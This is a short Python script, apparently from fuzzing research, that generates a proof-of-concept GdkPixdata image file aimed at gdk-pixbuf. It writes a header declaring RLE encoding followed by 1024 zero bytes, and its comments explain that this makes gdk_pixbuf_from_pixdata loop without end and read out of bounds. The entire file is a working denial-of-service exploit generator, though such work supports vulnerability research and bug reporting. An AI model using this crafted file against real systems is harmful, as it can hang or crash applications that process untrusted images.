#!/usr/bin/env python3
import struct, os

poc_dir = "/data/ylwang/non-textfuzz/target/_poc/gdk-pixbuf/gdk-pixbuf_gdk-pixbuf_c"
os.makedirs(poc_dir, exist_ok=True)

magic = 0x47646b50
width = 4
height = 4
bpp = 3  # RGB
rowstride = width * bpp
# GDK_PIXDATA_ENCODING_RLE  = 0x02 << 24 = 0x02000000
# GDK_PIXDATA_SAMPLE_WIDTH_8 = 0x01 << 16 = 0x00010000
# GDK_PIXDATA_COLOR_TYPE_RGB = 0x01
pixdata_type = 0x02010001  # RLE + SAMPLE_WIDTH_8 + RGB

# RLE pixel data: all 0x00 bytes = repeated literal-run with count=0
# Each 0x00 byte: literal-run count=0, image_buffer doesn't advance,
# rle_buffer advances by 1 reading the next 0x00, looping out of bounds.
# Without bounds guard in gdk_pixbuf_from_pixdata → effectively infinite read loop.
# Use a large block so the loop runs long before falling off the buffer.
pixel_data = b'\x00' * 1024  # all zero-length literal runs → loop DoS

# NOTE: We set length in header to only cover actual data (gdk_pixdata_deserialize
# validates stream_length >= pixdata->length - header).
# But gdk_pixbuf_from_pixdata does NOT bound rle_buffer, so it reads past pixel_data.
total_length = 24 + len(pixel_data)

header = struct.pack('>IIIIII',
    magic,
    total_length,
    pixdata_type,
    rowstride,
    width,
    height,
)

data = header + pixel_data

outfile = os.path.join(poc_dir, "vuln_004.gdkp")
with open(outfile, 'wb') as f:
    f.write(data)

print(f"Generated {outfile} ({len(data)} bytes)")
print(f"  4x4 RGB RLE, first RLE byte = 0x00 (literal-run, count=0)")
print(f"  This triggers infinite loop in gdk_pixbuf_from_pixdata()")
